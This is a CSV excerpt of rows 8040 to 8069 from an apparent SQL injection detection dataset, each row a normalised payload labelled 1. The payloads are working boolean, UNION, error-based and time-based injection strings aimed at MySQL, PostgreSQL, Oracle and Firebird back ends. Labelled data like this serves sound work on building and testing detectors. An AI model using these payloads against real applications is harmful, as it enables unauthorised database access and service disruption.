row_index,payload_norm,label,sqli_type_hint
8040,"1' ) where 6720 = 6720 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8041,"1%' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8042,-7663' ) ) or 1558 = 1104 and ( ( 'wsrq' = 'wsrq,1,
8043,1 ) ) as rvex where 3462 = 3462 and 4595 = 4595#,1,
8044,1' ) where 4500 = 4500,1,
8045,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
8046,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'nhrc' like 'nhrc,1,
8047,"-6357"" ) union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",1,
8048,1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,1,
8049,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'jylk' = 'jylk",1,
8050,"1 ) ) as jmcp where 8624 = 8624 union all select null,null,null,null,null,null,null,null,null,null--",1,
8051,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""bkrk"" = ""bkrk",1,
8052,"-8794 ) ) ) union all select 5802,5802,5802--",1,
8053,"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""%"" = """,1,
8054,"1"" ) ) as nhus where 3689 = 3689",1,
8055,"-3228"" ) or ( 5901 = 1570 ) *1570 and ( ""egdd"" = ""egdd",1,
8056,1' where 7725 = 7725 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
8057,"select * from generate_series ( 7762,7762,case when ( 7762 = 1293 ) then 1 else 0 end ) limit 1--",1,
8058,"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",1,
8059,"-1722' union all select 1408,1408,1408#",1,
8060,-1940 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),1,
8061,1'|| ( select 'npdx' from dual where 9486 = 9486 and sleep ( 5 ) ) ||',1,
8062,1 ) as bidc where 5268 = 5268 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,
8063,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",1,
8064,1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,1,
8065,1 where 3744 = 3744,1,
8066,"1, ( select 6825 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6825 = 6825,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,
8067,"1"" ) as eaxo where 2728 = 2728",1,
8068,"1"" ) ) as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,
8069,1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,1,
